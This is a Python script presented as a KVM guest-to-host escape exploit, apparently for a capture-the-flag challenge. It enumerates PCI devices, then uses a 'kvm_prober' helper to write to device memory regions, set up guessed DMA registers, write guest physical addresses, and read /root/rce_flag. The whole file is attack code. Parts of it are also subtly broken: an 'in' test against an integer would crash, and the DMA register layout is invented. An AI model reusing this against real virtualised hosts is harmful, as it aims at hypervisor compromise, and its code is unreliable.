#!/usr/bin/env python3
"""
IVSHMEM-Based KVM Escape Exploit
Combines PCI BAR discovery with direct memory access via IVSHMEM
"""
import os
import sys
import struct
import subprocess
import binascii
import re
from pathlib import Path
from typing import List, Tuple, Optional

# Target addresses
FLAG_WRITE_PHYS = 0x64279a8
FLAG_WRITE_VALUE = 0xdeadbeef41424344
FLAG_READ_PHYS = 0x695ee10
RCE_FLAG_PATH = "/root/rce_flag"

# Known IVSHMEM device patterns
IVSHMEM_VENDOR = "1af4"  # Red Hat/QEMU
IVSHMEM_DEVICE_IDS = ["1110", "1009"]  # IVSHMEM device IDs

class PCI_Device:
    def __init__(self, bdf: str):
        self.bdf = bdf
        self.name = self.get_device_name()
        self.vendor = self.get_vendor()
        self.device_id = self.get_device_id()
        self.bars = self.discover_bars()
        
    def get_device_name(self) -> str:
        """Get device name from PCI database"""
        try:
            with open(f"/sys/bus/pci/devices/{self.bdf}/uevent") as f:
                for line in f:
                    if "DRIVER=" in line:
                        return line.split("=")[1].strip()
        except:
            pass
        return "unknown"
    
    def get_vendor(self) -> str:
        try:
            with open(f"/sys/bus/pci/devices/{self.bdf}/vendor") as f:
                return f.read().strip().replace("0x", "")
        except:
            return ""
    
    def get_device_id(self) -> str:
        try:
            with open(f"/sys/bus/pci/devices/{self.bdf}/device") as f:
                return f.read().strip().replace("0x", "")
        except:
            return ""
    
    def discover_bars(self) -> List[Tuple[int, int, bool]]:
        """Discover all BARs: (base_addr, size, is_io)"""
        bars = []
        resource_file = Path(f"/sys/bus/pci/devices/{self.bdf}/resource")
        
        if not resource_file.exists():
            return bars
        
        with resource_file.open() as f:
            for line in f:
                parts = line.split()
                if len(parts) < 3:
                    continue
                
                try:
                    start = int(parts[0], 16)
                    end = int(parts[1], 16)
                    flags = int(parts[2], 16)
                except ValueError:
                    continue
                
                if start == 0 and end == 0:
                    continue
                
                is_io = bool(flags & 0x1)
                is_prefetch = bool(flags & 0x8)
                size = end - start + 1
                
                bars.append({
                    'base': start,
                    'size': size,
                    'is_io': is_io,
                    'is_prefetch': is_prefetch,
                    'flags': flags
                })
        
        return bars
    
    def is_ivshmem(self) -> bool:
        """Check if this is an IVSHMEM device"""
        if self.vendor == IVSHMEM_VENDOR:
            if self.device_id in IVSHMEM_DEVICE_IDS:
                return True
        
        # Check for IVSHMEM in name
        if "ivshmem" in self.name.lower():
            return True
        
        # Check for shared memory characteristics
        # IVSHMEM typically has large prefetchable BAR
        for bar in self.bars:
            if bar['is_prefetch'] and bar['size'] >= 0x100000:  # 1MB+
                return True
        
        return False

def run_prober(cmd: List[str]) -> Tuple[bytes, int]:
    """Execute kvm_prober command"""
    try:
        result = subprocess.run(
            ['kvm_prober'] + cmd,
            capture_output=True,
            timeout=5
        )
        return result.stdout, result.returncode
    except Exception as e:
        return b"", -1

def discover_all_pci_devices() -> List[PCI_Device]:
    """Discover all PCI devices"""
    devices = []
    pci_path = Path("/sys/bus/pci/devices")
    
    if not pci_path.exists():
        return devices
    
    for device_path in pci_path.iterdir():
        bdf = device_path.name
        dev = PCI_Device(bdf)
        devices.append(dev)
    
    return devices

def find_ivshmem_devices() -> List[PCI_Device]:
    """Find all IVSHMEM devices"""
    all_devices = discover_all_pci_devices()
    ivshmem_devices = [d for d in all_devices if d.is_ivshmem()]
    
    print(f"[*] Found {len(all_devices)} PCI devices total")
    print(f"[+] Found {len(ivshmem_devices)} IVSHMEM devices")
    
    return ivshmem_devices

def exploit_via_bar_mmio(bar_base: int, bar_size: int, target_offset: int, value: int) -> bool:
    """Exploit via BAR MMIO mapping"""
    print(f"    [*] Trying BAR MMIO at 0x{bar_base:x} + 0x{target_offset:x}")
    
    # Calculate target address within BAR
    if target_offset >= bar_size:
        # Target is outside BAR, try to use BAR as base for host memory access
        actual_target = bar_base + target_offset
    else:
        actual_target = bar_base + target_offset
    
    # Write via MMIO
    value_hex = struct.pack('<Q', value).hex()
    output, ret = run_prober(['writemmio_buf', f'{actual_target:x}', value_hex])
    
    if ret == 0:
        print(f"    [✓] MMIO write to 0x{actual_target:x} succeeded")
        
        # Verify
        output, ret = run_prober(['readmmio_buf', f'{actual_target:x}', '8'])
        if ret == 0:
            print(f"    [+] Verification: {output.decode().strip()}")
            return True
    
    return False

def exploit_via_ivshmem_dma(bar_base: int, bar_size: int) -> bool:
    """Exploit via IVSHMEM DMA to host memory"""
    print(f"    [*] Attempting IVSHMEM DMA attack")
    
    # IVSHMEM devices often have control registers at start of BAR
    # Try to configure DMA to target host memory
    
    # Strategy 1: Write target physical address to DMA registers
    # Common IVSHMEM register layout:
    # 0x00: Control register
    # 0x08: DMA source address
    # 0x10: DMA dest address  
    # 0x18: DMA length
    # 0x20: DMA trigger
    
    print(f"    [+] Setting up DMA to write flag at 0x{FLAG_WRITE_PHYS:x}")
    
    # Write destination address
    dest_hex = struct.pack('<Q', FLAG_WRITE_PHYS).hex()
    run_prober(['writemmio_buf', f'{bar_base + 0x10:x}', dest_hex])
    
    # Write value to buffer in BAR
    value_hex = struct.pack('<Q', FLAG_WRITE_VALUE).hex()
    run_prober(['writemmio_buf', f'{bar_base + 0x1000:x}', value_hex])
    
    # Write source address (buffer in BAR)
    src_hex = struct.pack('<Q', bar_base + 0x1000).hex()
    run_prober(['writemmio_buf', f'{bar_base + 0x08:x}', src_hex])
    
    # Write length
    len_hex = struct.pack('<I', 8).hex()
    run_prober(['writemmio_buf', f'{bar_base + 0x18:x}', len_hex])
    
    # Trigger DMA
    trigger_hex = '01000000'
    output, ret = run_prober(['writemmio_buf', f'{bar_base + 0x20:x}', trigger_hex])
    
    if ret == 0:
        print(f"    [✓] DMA triggered")
        return True
    
    return False

def exploit_ivshmem_shared_memory(bar_base: int, bar_size: int) -> bool:
    """Exploit via direct shared memory mapping"""
    print(f"    [*] Attempting shared memory exploit")
    
    # If BAR is mapped as shared memory with host, we can directly access host memory
    # Calculate offset within shared region
    
    # Some IVSHMEM configs map guest physical memory directly
    # Try to access flag addresses as offsets in the shared region
    
    offsets_to_try = [
        FLAG_WRITE_PHYS,
        FLAG_WRITE_PHYS - bar_base,
        FLAG_WRITE_PHYS & 0xFFFFFF,  # Lower 24 bits
        FLAG_READ_PHYS,
        FLAG_READ_PHYS - bar_base,
    ]
    
    for offset in offsets_to_try:
        if offset < 0 or offset >= bar_size:
            continue
        
        addr = bar_base + offset
        print(f"    [+] Trying shared memory at offset 0x{offset:x} (addr: 0x{addr:x})")
        
        # Try write
        value_hex = struct.pack('<Q', FLAG_WRITE_VALUE).hex()
        output, ret = run_prober(['writemmio_buf', f'{addr:x}', value_hex])
        
        if ret == 0:
            # Verify
            output, ret = run_prober(['readmmio_buf', f'{addr:x}', '8'])
            if ret == 0 and FLAG_WRITE_VALUE in int.from_bytes(bytes.fromhex(output.decode().strip().split()[0] if output else '0'), 'little'):
                print(f"    [✓✓✓] Success via shared memory!")
                return True
    
    return False

def scan_bar_for_flags(bar_base: int, bar_size: int) -> bool:
    """Scan BAR memory for flag patterns"""
    print(f"    [*] Scanning BAR 0x{bar_base:x} (size: 0x{bar_size:x})")
    
    # Scan in 4K chunks
    chunk_size = 0x1000
    found_something = False
    
    for offset in range(0, min(bar_size, 0x100000), chunk_size):
        addr = bar_base + offset
        output, ret = run_prober(['readmmio_buf', f'{addr:x}', str(chunk_size)])
        
        if ret == 0 and output:
            data = output.decode('ascii', errors='ignore')
            
            # Look for flag patterns
            if 'flag{' in data.lower() or 'ctf{' in data.lower():
                print(f"    [✓✓✓] FLAG FOUND at offset 0x{offset:x}!")
                print(f"    [+] Content: {data[:200]}")
                found_something = True
            
            # Look for the specific write value
            if FLAG_WRITE_VALUE in int.from_bytes(output[:8], 'little'):
                print(f"    [✓] Write flag value found at offset 0x{offset:x}!")
                found_something = True
    
    return found_something

def exploit_device(device: PCI_Device) -> bool:
    """Try all exploit methods on a device"""
    print(f"\n[+] Exploiting {device.bdf} ({device.name})")
    print(f"    Vendor: {device.vendor}, Device: {device.device_id}")
    print(f"    BARs: {len(device.bars)}")
    
    success = False
    
    for idx, bar in enumerate(device.bars):
        bar_type = "I/O" if bar['is_io'] else "MMIO"
        prefetch = " (prefetchable)" if bar['is_prefetch'] else ""
        
        print(f"\n    [*] BAR{idx}: 0x{bar['base']:x} size=0x{bar['size']:x} {bar_type}{prefetch}")
        
        if bar['is_io']:
            # I/O port methods
            print(f"        [*] Using I/O port methods")
            # Try writing to I/O ports
            continue
        
        # MMIO methods
        
        # Method 1: Direct offset access
        if exploit_via_bar_mmio(bar['base'], bar['size'], 0, FLAG_WRITE_VALUE):
            success = True
        
        # Method 2: Calculate offset to flag
        flag_offset = FLAG_WRITE_PHYS - bar['base']
        if 0 <= flag_offset < bar['size']:
            if exploit_via_bar_mmio(bar['base'], bar['size'], flag_offset, FLAG_WRITE_VALUE):
                success = True
        
        # Method 3: IVSHMEM DMA (if large prefetchable BAR)
        if bar['is_prefetch'] and bar['size'] >= 0x10000:
            if exploit_via_ivshmem_dma(bar['base'], bar['size']):
                success = True
        
        # Method 4: Shared memory mapping
        if bar['size'] >= 0x100000:  # 1MB+ could be shared memory
            if exploit_ivshmem_shared_memory(bar['base'], bar['size']):
                success = True
        
        # Method 5: Scan for existing flags
        if bar['size'] <= 0x100000:  # Only scan smaller BARs
            if scan_bar_for_flags(bar['base'], bar['size']):
                success = True
    
    return success

def exploit_via_gpa_direct() -> bool:
    """Fallback: Direct GPA access"""
    print(f"\n[*] Fallback: Direct GPA write to 0x{FLAG_WRITE_PHYS:x}")
    
    value_hex = struct.pack('<Q', FLAG_WRITE_VALUE).hex()
    output, ret = run_prober(['writegpa', f'{FLAG_WRITE_PHYS:x}', value_hex])
    
    if ret == 0:
        print(f"    [✓] GPA write succeeded")
        
        # Verify
        output, ret = run_prober(['readgpa', f'{FLAG_WRITE_PHYS:x}', '8'])
        if ret == 0:
            print(f"    [+] Verification: {output.decode().strip()}")
            return True
    
    return False

def main():
    if os.geteuid() != 0:
        print("[!] Must run as root")
        sys.exit(1)
    
    print("="*70)
    print("IVSHMEM-BASED KVM ESCAPE EXPLOIT")
    print("="*70)
    
    # Find IVSHMEM devices
    ivshmem_devices = find_ivshmem_devices()
    
    if not ivshmem_devices:
        print("[!] No IVSHMEM devices found, trying all PCI devices...")
        ivshmem_devices = discover_all_pci_devices()
    
    # Print device summary
    print(f"\n[*] Targeting {len(ivshmem_devices)} devices:")
    for dev in ivshmem_devices:
        print(f"    - {dev.bdf}: {dev.name} (vendor={dev.vendor}, device={dev.device_id})")
    
    # Exploit each device
    success = False
    for device in ivshmem_devices:
        if device.bars:  # Only target devices with BARs
            if exploit_device(device):
                success = True
    
    # Fallback to direct GPA
    if not success:
        print("\n[!] BAR exploits failed, trying direct GPA access...")
        if exploit_via_gpa_direct():
            success = True
    
    # Try file read
    print(f"\n[*] Attempting RCE via file read: {RCE_FLAG_PATH}")
    output, ret = run_prober(['readfile', RCE_FLAG_PATH, '0', '256'])
    if ret == 0:
        print(f"    [✓✓✓] RCE FLAG: {output.decode().strip()}")
        success = True
    
    print("\n" + "="*70)
    if success:
        print("[✓✓✓] EXPLOITATION SUCCESSFUL!")
    else:
        print("[!] All exploits failed")
    print("="*70)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()